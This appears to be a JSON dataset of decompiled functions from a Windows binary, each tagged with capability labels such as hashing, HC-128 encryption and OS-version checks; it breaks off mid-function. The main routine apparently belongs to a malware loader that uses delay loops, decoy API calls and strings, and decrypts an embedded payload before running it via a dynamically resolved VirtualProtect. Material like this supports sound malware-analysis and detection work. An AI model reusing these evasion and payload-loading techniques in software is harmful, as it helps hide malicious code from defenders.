{
    "0040109b": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040109b(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar5 = *0x419864;\n    iVar4 = *0x419860;\n    iVar3 = *0x41985c;\n    iVar2 = *0x419858;\n    uVar6 = param_1[1];\n    uVar8 = *param_1;\n    iVar7 = -0x3910c8e0;\n    var_4h = 0x20;\n    do {\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(0);\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar6 = uVar6 - ((uVar8 >> 5) + iVar5 ^ uVar8 * 0x10 + iVar4 ^ iVar7 + uVar8);\n        uVar1 = iVar7 + uVar6;\n        iVar7 = iVar7 + 0x61c88647;\n        uVar8 = uVar8 - ((uVar6 >> 5) + iVar3 ^ uVar6 * 0x10 + iVar2 ^ uVar1);\n        var_4h = var_4h + -1;\n    } while (var_4h != 0);\n    *param_1 = uVar8;\n    param_1[1] = uVar6;\n    return;\n}\n",
        "token_count": 395
    },
    "004061a1": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004061a1(int32_t param_1)\n\n{\n    int32_t *arg_14h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    uint unaff_ESI;\n    int32_t arg_10h;\n    uint16_t uVar6;\n    uint arg_8h;\n    uint arg_ch_00;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41c004 ^ &stack0xfffffffc;\n    uVar6 = *(param_1 + 0x32);\n    if (uVar6 < 0x65) {\n        if (uVar6 == 100) {\ncode_r0x00406260:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x00406264:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x00406267:\n            cVar5 = fcn.004066f3(arg_8h, arg_ch_00);\n        }\n        else if (uVar6 < 0x59) {\n            if (uVar6 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0040620c:\n                arg_8h = 0x10;\n                goto code_r0x00406267;\n            }\n            if (uVar6 != 0x41) {\n                if (uVar6 == 0x43) goto code_r0x00406220;\n                if (uVar6 < 0x45) goto code_r0x004063ee;\n                if (0x47 < uVar6) {\n                    if (uVar6 != 0x53) goto code_r0x004063ee;\n                    goto code_r0x004061f4;\n                }\n            }\ncode_r0x00406270:\n            cVar5 = fcn.004064e9();\n        }\n        else if (uVar6 == 0x5a) {\n            cVar5 = fcn.00406486();\n        }\n        else {\n            if (uVar6 == 0x61) goto code_r0x00406270;\n            if (uVar6 != 99) goto code_r0x004063ee;\ncode_r0x00406220:\n            cVar5 = fcn.0040665b(0);\n        }\n    }\n    else if (uVar6 < 0x71) {\n        if (uVar6 == 0x70) {\n            cVar5 = fcn.004068d0();\n        }\n        else {\n            if (uVar6 < 0x68) goto code_r0x00406270;\n            if (uVar6 == 0x69) goto code_r0x00406260;\n            if (uVar6 == 0x6e) {\n                cVar5 = fcn.0040683d();\n            }\n            else {\n                if (uVar6 != 0x6f) goto code_r0x004063ee;\n                cVar5 = fcn.004068b1();\n            }\n        }\n    }\n    else {\n        if (uVar6 != 0x73) {\n            if (uVar6 != 0x75) {\n                if (uVar6 != 0x78) goto code_r0x004063ee;\n                arg_ch_00 = 0;\n                goto code_r0x0040620c;\n            }\n            goto code_r0x00406264;\n        }\ncode_r0x004061f4:\n        cVar5 = fcn.004068e8();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x004063ee;\n    uVar2 = *(param_1 + 0x20);\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    arg_ch = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                }\n                goto code_r0x004062ee;\n            }\n            uVar6 = 0x2b;\n        }\n        else {\n            uVar6 = 0x2d;\n        }\n        var_ch = uVar6;\n        arg_ch = 1;\n    }\ncode_r0x004062ee:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = (!bVar3 - 1U & 0xe0) + 0x78;\n        arg_ch = arg_ch + 2;\n    }\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.00405b71(param_1 + 0x448, 0x20, arg_10h, param_1 + 0x18);\n    }\n    fcn.00406a87(&var_ch, arg_ch, param_1 + 0x18, *(param_1 + 0xc));\n    arg_14h = param_1 + 0x18;\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00405b71(param_1 + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.004069fc(0);\n    if ((-1 < *arg_14h) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00405b71(param_1 + 0x448, 0x20, arg_10h, arg_14h);\n    }\ncode_r0x004063ee:\n    fcn.004033b0(unaff_ESI);\n    return;\n}\n",
        "token_count": 1643
    },
    "004068b1": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004068b1(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.004066f3(8, 0);\n    return;\n}\n",
        "token_count": 92
    },
    "00401135": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401135(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    for (uVar1 = *param_2 >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        (*_sym.imp.GDI32.dll_AbortPath)(0);\n        fcn.0040109b();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid main(void)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    code *pcVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t extraout_ECX;\n    uint32_t uVar7;\n    uint arg_10h;\n    uint arg_14h;\n    char16_t *arg_18h;\n    ulong uVar8;\n    uint uStack900;\n    uint uStack896;\n    uint uStack892;\n    uint uStack888;\n    uint uStack884;\n    uint uStack880;\n    uint uStack876;\n    uint uStack872;\n    uint uStack868;\n    uint uStack864;\n    uint uStack860;\n    uint uStack856;\n    uint uStack852;\n    uint uStack848;\n    uint uStack844;\n    uint uStack840;\n    uint uStack836;\n    uint uStack832;\n    uint uStack828;\n    uint uStack824;\n    uint uStack820;\n    uint uStack816;\n    uint uStack812;\n    uint uStack808;\n    uint uStack804;\n    uint uStack800;\n    uint uStack796;\n    uint uStack792;\n    uint uStack788;\n    uint32_t uStack784;\n    uint uStack780;\n    uint uStack776;\n    uint uStack772;\n    uint uStack768;\n    uint uStack764;\n    uint uStack760;\n    uint uStack756;\n    uint uStack752;\n    uint uStack748;\n    uint uStack744;\n    uint uStack740;\n    uint uStack736;\n    uint uStack732;\n    uint uStack728;\n    uint uStack724;\n    uint uStack720;\n    uint uStack716;\n    uint uStack712;\n    uint uStack708;\n    uint uStack704;\n    uint uStack700;\n    uint uStack696;\n    uint uStack692;\n    uint uStack688;\n    uint uStack684;\n    uint uStack680;\n    uint uStack676;\n    uint uStack672;\n    uint uStack668;\n    uint uStack664;\n    uint uStack660;\n    uint uStack656;\n    uint uStack652;\n    uint uStack648;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uint uStack580;\n    uint uStack576;\n    uint uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint uStack528;\n    uint uStack524;\n    uint uStack520;\n    uint uStack516;\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uint uStack500;\n    uint uStack496;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint uStack472;\n    uint uStack468;\n    uint uStack464;\n    uint uStack460;\n    int32_t iStack456;\n    uint uStack452;\n    uint uStack448;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uint uStack424;\n    uint uStack420;\n    uint uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uchar auStack200 [4];\n    uchar auStack196 [4];\n    uchar auStack192 [8];\n    int32_t iStack184;\n    int32_t iStack156;\n    uchar auStack148 [4];\n    int16_t iStack144;\n    uchar auStack128 [16];\n    uchar auStack112 [16];\n    int32_t iStack96;\n    int32_t iStack76;\n    uint32_t uStack12;\n    \n    uStack12 = *0x41c004 ^ &uStack900;\n    bVar2 = true;\n    (*_sym.imp.USER32.dll_PostMessageW)(0, 1, 0, 0);\n    (*_sym.imp.USER32.dll_PeekMessageW)(auStack148, 0, 0, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHandleCount;\n    if ((iStack156 == 0x159) && (iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(0x41da70),  0x216 < iVar5)) {\n        (*pcVar1)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetProcessShutdownParameters)(0, 0);\n        (*pcVar1)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GetProcessWorkingSetSize)(0, 0, 0);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetLongPathNameA;\n        (*_sym.imp.KERNEL32.dll_GetLongPathNameA)(0, 0, 0);\n        (*_sym.imp.SHELL32.dll_ShellAboutA)(0, 0, 0, 0);\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0, 0, 0, 0);\n        iVar5 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0, 0, 0);\n        if (iVar5 == 0) {\n            (*_sym.imp.KERNEL32.dll_TerminateProcess)(0, 0);\n        }\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(0, 0);\n        (*_sym.imp.USER32.dll_EnableScrollBar)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        (*_sym.imp.KERNEL32.dll_GetProcessAffinityMask)(0, 0, 0);\n        (*pcVar1)(0, 0);\n        (*pcVar3)(0, 0, 0);\n        uStack292 = 0;\n        uStack288 = 0;\n        uStack284 = 0;\n        fcn.00402c11(\"xafogodatokedanofijo\");\n        fcn.00402b43(&uStack280);\n        fcn.00402cb1(1, 0);\n        fcn.00402c11(\"wobirodavaxe cohewavezexupemabujo noguduzilevebutu\");\n        fcn.00402b43(&uStack296);\n        fcn.00402cb1(1, 0);\n        fcn.004056d0();\n        fcn.00406e36(0);\n        fcn.004056b7(0x165dab9, 1);\n        fcn.004057d0(*0x419a20, *0x419a24, *0x419a28, *0x419a2c);\n        uVar8 = 0x4198c400000000;\n        arg_18h = L\"suxokuxe yeguhajeravatajizitelujumamaca dehigexibicewukehedihove\";\n        arg_14h = 0xcad;\n        arg_10h = 0x41d270;\n        puVar6 = fcn.00401000();\n        fcn.00406b21(*puVar6, puVar6[1], arg_10h, arg_14h, arg_18h, uVar8, uVar8 >> 0x20);\n        (*_sym.imp.USER32.dll_BeginPaint)(0, 0);\n        (*_sym.imp.MSIMG32.dll_TransparentBlt)(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);\n        fcn.00402aea();\n    }\n    (*pcVar1)(0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetFileInformationByHandle;\n    uVar7 = 0;\n    do {\n        if (!bVar2) break;\n        (*_sym.imp.KERNEL32.dll_GetSystemTime)(auStack148);\n        (*pcVar1)(0, auStack112);\n        (*_sym.imp.KERNEL32.dll_GetAtomNameW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetFileType)(0);\n        if ((((0x18364c < uVar7) && (iStack144 != 0x3039)) && (iStack96 != 0x344631)) &&\n           ((iStack184 != 0x20f6580 && (iStack456 != 0x52cca9)))) {\n            bVar2 = false;\n        }\n        if (*0x41e278 == 0) {\n            *0x41e278 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"kernel32.dll\");\n        }\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x8b9a6f96);\n    uStack608 = 0x4f815cb2;\n    uStack616 = 0x63b30ed7;\n    uStack452 = 0x1b6cc5bb;\n    uStack612 = 0x379e4077;\n    uStack448 = 0x7436c79f;\n    uStack444 = 0x62db80f8;\n    uStack592 = 0x58f54e32;\n    uStack624 = 0xee9ca75;\n    uStack504 = 0x543054be;\n    uStack440 = 0x1f159b2;\n    uStack516 = 0x4fecd01b;\n    uStack688 = 0x48a2aa63;\n    uStack588 = 0x333f4cdf;\n    uStack524 = 0x65453f6e;\n    uStack584 = 0x724ad75f;\n    uStack552 = 0x336d049;\n    uStack436 = 0x670e36f2;\n    uStack432 = 0x18696a1f;\n    uStack428 = 0x5184f940;\n    uStack572 = 0x3b9fc8f2;\n    uStack724 = 0x365ec9e2;\n    uStack520 = 0x73ad04f1;\n    uStack424 = 0x1ad9ca81;\n    uStack420 = 0x5b07c1d9;\n    uStack560 = 0x4956bdf0;\n    uStack416 = 0x40ca31fe;\n    uStack412 = 0x6d3ce7df;\n    uStack408 = 0x2ac91bb9;\n    uStack404 = 0x5429525e;\n    uStack400 = 0x2a6c89db;\n    uStack396 = 0x287e1329;\n    uStack392 = 0x3b252261;\n    uStack388 = 0x43d4e265;\n    uStack576 = 0x6e59f369;\n    uStack384 = 0x5f160703;\n    uStack380 = 0x24fa614a;\n    uStack376 = 0x1478ca52;\n    uStack372 = 0x1f40c915;\n    uStack368 = 0x59af4a02;\n    uStack540 = 0x57122b8e;\n    uStack364 = 0x550a3fb7;\n    uStack360 = 0x75304cf;\n    uStack356 = 0x673d8751;\n    uStack352 = 0x1d738a96;\n    uStack348 = 0x5cd2d491;\n    uStack344 = 0xa724779;\n    uStack496 = 0x54b56462;\n    uStack340 = 0x3e92095e;\n    uStack336 = 0x7a549935;\n    uStack332 = 0x15acc2ba;\n    uStack328 = 0x7d548909;\n    uStack324 = 0x48a39299;\n    uStack320 = 0x2fbf5f8d;\n    uStack316 = 0x58050590;\n    uStack312 = 0x13d4ffdd;\n    uStack308 = 0x68814f5d;\n    uStack304 = 0x6559d42d;\n    uStack300 = 0x862ce72;\n    uStack296 = 0x3babaeb1;\n    uStack292 = 0x16f4d6db;\n    uStack288 = 0x76fd0fc;\n    uStack284 = 0x440edd91;\n    uStack280 = 0x3702f562;\n    uStack276 = 0x36e3e5ad;\n    uStack272 = 0x18f385f9;\n    uStack268 = 0x5f486a9b;\n    uStack264 = 0x5ea5e91e;\n    uStack260 = 0x68fec957;\n    uStack256 = 0xa95a917;\n    uStack252 = 0x44c66310;\n    uStack248 = 0x2cd902c8;\n    uStack244 = 0x56007a94;\n    uStack240 = 0x22ca42a;\n    uStack236 = 0x18ab7394;\n    uStack232 = 0x7fb74c12;\n    uStack228 = 0x3842be53;\n    uStack224 = 0x6c86162d;\n    uStack220 = 0x4165bc64;\n    uStack216 = 0x351d9b6e;\n    uStack212 = 0x3dc38b6c;\n    uStack208 = 0x48a47fdd;\n    uStack204 = 0x33fa9f9c;\n    uStack652 = 0xc43a76b6;\n    uStack892 = 0x46afea9d;\n    uStack896 = 0x88f50f20;\n    uStack884 = 0xf9136ea7;\n    uStack648 = 0xd0b962f7;\n    uStack772 = 0xaceee061;\n    uStack900 = 0x346de009;\n    uStack824 = 0xaaff91c;\n    uStack756 = 0x3b3cd0bb;\n    uStack644 = 0x2425e56a;\n    uStack640 = 0x17da8b08;\n    uStack636 = 0x601d6534;\n    uStack768 = 0x95866b33;\n    uStack632 = 0x7ebcf90f;\n    uStack628 = 0xf2af5b5b;\n    uStack820 = 0xbcf3d9ca;\n    uStack876 = 0x2a57d062;\n    uStack840 = 0x34e7aefc;\n    uStack760 = 0xaf51643;\n    uStack764 = 0x443a76a;\n    uStack864 = 0x87c33fe3;\n    uStack880 = 0x64e9e831;\n    uStack620 = 0xa17a88c0;\n    uStack816 = 0xf50b1f48;\n    uStack812 = 0x1810cff3;\n    uStack836 = 0x10bbae0d;\n    uStack752 = 0x7f87c318;\n    uStack604 = 0x1f6b29ad;\n    uStack600 = 0xea2c6145;\n    uStack728 = 0xfcb9004a;\n    uStack748 = 0x93533396;\n    uStack808 = 0xed8c9f9e;\n    uStack744 = 0x8d95e240;\n    uStack596 = 0x5316ba2;\n    uStack740 = 0xde66889;\n    uStack664 = 0x26fb6d62;\n    uStack804 = 0x2ed0b774;\n    uStack736 = 0x3f587464;\n    uStack888 = 0x290b3ed3;\n    uStack800 = 0x4aff428c;\n    uStack580 = 0xdd8431b;\n    uStack780 = 0xe9ac574a;\n    uStack568 = 0x1749dadb;\n    uStack564 = 0x83ad29b0;\n    uStack732 = 0x35b7d56b;\n    uStack556 = 0x96f1b951;\n    uStack668 = 0xa305d969;\n    uStack796 = 0xb529295c;\n    uStack548 = 0x21c1eacd;\n    uStack544 = 0x4f249026;\n    uStack720 = 0x27a90fc3;\n    uStack860 = 0x991c66ec;\n    uStack716 = 0x1b0848b;\n    uStack536 = 0x6bf5cf5c;\n    uStack532 = 0xfb345789;\n    uStack856 = 0xbc5330f1;\n    uStack700 = 0xcaf4a264;\n    uStack852 = 0x60fcc029;\n    uStack528 = 0x4b931ed1;\n    uStack848 = 0xbe76e3ce;\n    uStack712 = 0xe0c589a8;\n    uStack792 = 0xa702800e;\n    uStack708 = 0x1e695026;\n    uStack788 = 0x64bfff34;\n    uStack844 = 0x1da5cda7;\n    uStack512 = 0xac866cfb;\n    uStack784 = 0x6f3cc6c4;\n    uStack704 = 0x55fc9e58;\n    uStack508 = 0x901b6bfc;\n    uStack696 = 0xacc54810;\n    uStack500 = 0x2c44fd27;\n    uStack684 = 0xa62c0a8b;\n    uStack872 = 0x659e22e;\n    uStack692 = 0x30fccea6;\n    uStack492 = 0xc5ddf8cf;\n    uStack488 = 0x177b2bd4;\n    uStack484 = 0xaaeaea1d;\n    uStack680 = 0xe2c6ed40;\n    uStack676 = 0xf0bb77a5;\n    uStack480 = 0xfaa94468;\n    uStack672 = 0xa41bf2f1;\n    uStack476 = 0x713868bc;\n    uStack472 = 0x3b95abb2;\n    uStack468 = 0x5afd0055;\n    uStack464 = 0xfbcb12ed;\n    uStack832 = 0xf8fe1df8;\n    uStack660 = 0x46bb823a;\n    uStack656 = 0x4e743fe1;\n    uStack460 = 0x7d7387b0;\n    uStack868 = 0x81dd6fdf;\n    uStack828 = 0x469da2d0;\n    iVar5 = 0;\n    while( true ) {\n        (*_sym.imp.KERNEL32.dll_GetMailslotInfo)(0, auStack192, &iStack456, auStack196, auStack200);\n        (*pcVar1)(0, auStack128);\n        if (((0x7b379 < iVar5) && (iStack456 != 0x1cecd011)) && (iStack76 != 0x1d47b417)) break;\n        iVar5 = iVar5 + 2;\n        if (0x23b971 < iVar5) {\ncode_r0x00402a52:\n            uStack776 = 0x1dbf0;\n            *0x41de74 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, 0x1dbf0);\n            uVar7 = 0;\n            iVar5 = extraout_ECX;\n            if (uStack784 != 0) {\n                do {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(0);\n                    (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar4 = fcn.00401167();\n                    iVar5 = *0x41de74;\n                    *(uVar7 + *0x41de74) = uVar4;\n                    uVar7 = uVar7 + 1;\n                } while (uVar7 < uStack784);\n            }\n            fcn.00401135(iVar5);\n            (**0x41de70)(*0x41de74, uStack784, 0x40, auStack196);\n            fcn.00401160();\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"Kernel32.dll\");\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(0x41da70, \"Virtual\");\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(0x41da70, \"Protect\");\n    *0x41de70 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e278, 0x41da70);\n    goto code_r0x00402a52;\n}\n",
        "token_count": 5216
    },
    "00402cb1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402cb1(uint arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    \n    if ((arg_8h != '\\0') && (0xf < in_ECX[5])) {\n        if (arg_ch != 0) {\n            fcn.004045b0();\n        }\n        fcn.00401053(1);\n    }\n    in_ECX[5] = 0xf;\n    in_ECX[4] = arg_ch;\n    if (0xf < in_ECX[5]) {\n        in_ECX = *in_ECX;\n    }\n    *(in_ECX + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 153
    },
    "0040826e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040826e(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x41d258, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00409404();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0040938b(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "004057e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004057e4(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x41c004 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.00409404();\n        *puVar1 = 0x16;\n        fcn.00406dd6();\n        goto code_r0x0040593b;\n    }\n    fcn.00405c5f(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00405c2a(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    iVar2 = fcn.00405e65();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x00405910;\ncode_r0x00405960:\n                    *(puVar1 + arg_14h * 2 + -2) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x00405960;\n                    goto code_r0x00405910;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x00405910:\n            *(puVar1 + var_468h * 2) = 0;\n        }\n    }\n    fcn.00405ce2();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x0040593b:\n    fcn.004033b0(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 803
    },
    "00406025": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00406025(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    int32_t arg_ch;\n    uint unaff_ESI;\n    int32_t arg_10h;\n    uint16_t uVar9;\n    uint arg_8h;\n    uint arg_ch_00;\n    uint uStack16;\n    ushort uStack12;\n    uint32_t uStack8;\n    \n    puVar6 = *(param_1 + 0x32);\n    if (puVar6 != 0x46) {\n        if (puVar6 == 0x4e) {\n            puVar6 = *param_1 & 8;\n            if (puVar6 == NULL) {\n                param_1[7] = 8;\ncode_r0x00406060:\n                puVar7 = fcn.00409404();\n                *puVar7 = 0x16;\n                uVar8 = fcn.00406dd6();\n                return uVar8 & 0xffffff00;\n            }\n        }\n        else {\n            if (param_1[0xb] != 0) goto code_r0x00406060;\n            if (puVar6 < 0x6b) {\n                if (puVar6 == 0x6a) {\n                    param_1[0xb] = 5;\n                }\n                else if (puVar6 == 0x49) {\n                    puVar2 = param_1[4];\n                    puVar6 = *puVar2;\n                    if ((puVar6 == 0x33) && (puVar2[1] == 0x32)) {\n                        puVar6 = puVar2 + 2;\n                        param_1[0xb] = 10;\n                        param_1[4] = puVar6;\n                    }\n                    else if ((puVar6 == 0x36) && (puVar2[1] == 0x34)) {\n                        puVar6 = puVar2 + 